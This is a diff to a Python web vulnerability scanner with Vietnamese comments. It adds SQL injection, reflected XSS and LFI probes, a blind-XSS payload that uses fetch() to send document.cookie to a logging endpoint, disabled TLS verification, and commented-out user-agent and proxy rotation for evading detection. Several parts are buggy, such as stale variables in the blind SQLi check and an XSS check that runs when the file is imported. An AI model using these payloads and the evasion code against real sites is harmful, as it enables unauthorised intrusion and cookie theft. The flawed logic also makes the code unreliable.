@@ -1,9 +1,16 @@
 import requests
 from urllib.parse import urljoin
 from bs4 import BeautifulSoup
+import re
+import sys
+
+# from Antidetect import *
+
 
 
 def scan_website(url):
+    # user_agent = get_random_user_agent()
+    # proxy = get_random_proxy()
     results = []
     
     # Crawl website 
@@ -11,6 +18,8 @@ def scan_website(url):
     
     # Scan URLs
     for u in urls:
+        # response = requests.get(url, headers={'User-Agent': user_agent}, proxies={'http': proxy, 'https': proxy})
+
         response = requests.get(u)
         
         if check_sqli(u, response):
@@ -26,7 +35,7 @@ def scan_website(url):
         
 def crawl(url):
     urls = []
-    response = requests.get(url)
+    response = requests.get(url.replace('https://', 'http://'), verify=False)
     parsed = BeautifulSoup(response.text, 'html.parser')
     
     for link in parsed.find_all('a'):
@@ -37,14 +46,29 @@ def crawl(url):
     return urls
 
 # Hàm kiểm tra SQL injection
-def check_sqli(url, response):
+def check_sqli(url, resp1):
   test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
   
   for test_url in test_urls:
-    response = requests.get(test_url)  
-    if check_error(response):
+    resp1 = requests.get(test_url)  
+    if check_error(resp1):
+      print("Error based SQLi detected")
       return True
-      
+
+# Kiểm tra blind SQLi
+  original_url = f"{url}&id=1" 
+  resp2 = requests.get(original_url)
+
+  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
+  resp3 = requests.get(test_url)
+
+  columns1 = len(resp2.text.split("</td>"))
+  columns2 = len(resp3.text.split("</td>"))
+
+  if columns1 != columns2:
+     print("Blind SQLi detected")
+     return True
+  
   return False
 
 def check_error(response):
@@ -57,38 +81,55 @@ def check_error(response):
     
   return False
 
-
+# -----------------------------------------------------------------------
 # Hàm kiểm tra XSS
+session = requests.Session()
+payloads = ["<script>alert(1)</script>", "';alert(1)//", "<img src=1 onerror=alert(1)>"] 
+
 def check_xss(url, response):
 
   soup = BeautifulSoup(response.content, 'html.parser')
 
-  # Tìm các input, form để test XSS
-  inputs = soup.find_all('input')
-  forms = soup.find_all('form')
-
-  test_payload = "<script>alert(1)</script>"
-
-  # Test XSS trên input fields
-  for input in inputs:
-    input['value'] = test_payload
-
-  # Test XSS trên forms
+  # Check forms
+  forms = soup.findAll('form')
   for form in forms:
-    form.findAll('input', {'name': True})[0]['value'] = test_payload
+    data = {} 
+    for input in form.findAll('input'):
+      for payload in payloads:
+        data[input.get('name')] = payload
+        response = session.post(url + form['action'], data=data)
+        if payload in response.text:
+          print('XSS in', url + form['action'])
 
-  # Kiểm tra xem có script reflect lại không
-  if test_payload in str(soup):
-    print("Reflected XSS detected by BeautifulSoup")
-    return True
-  
-  print("BeautifulSoup XSS test negative")
+  # Check URL parameters
+  params = re.findall(r'([^?=&]+)=([^&]*)', url)
+  for name, value in params:
+    for payload in payloads:
+      url = url.replace(f'{name}={value}', f'{name}={payload}')
+      response = session.get(url)
+      if payload in response.text:
+        print('XSS in', url)
+
   return False
 
+# ------------------------
+url = sys.argv[2]
+domain = url.rsplit('/', 1)[0]
 
+def check_blind_xss(url):
+  payload = f"<script>fetch('{domain}/log?cookie=' + document.cookie)</script>"
+
+  requests.get(url + payload)
+  
+  if requests.get(f"{domain}/log").text == "XSSCOOKIE":
+    print("Blind XSS detected")
+
+check_blind_xss(url)
+
+
+# -------------------------------------------------
 # Hàm kiểm tra LFI  
 def check_lfi(url):
-
   pwd_paths = []
   
   with open('pwd.txt') as f:
@@ -101,6 +142,7 @@ def check_lfi(url):
   
   # Nếu trả về nội dung file passwd là có LFI
   if "root:" in lfi_response.text and "nobody:" in lfi_response.text:
+    print("Detected LFI")
     return True
   
   return False
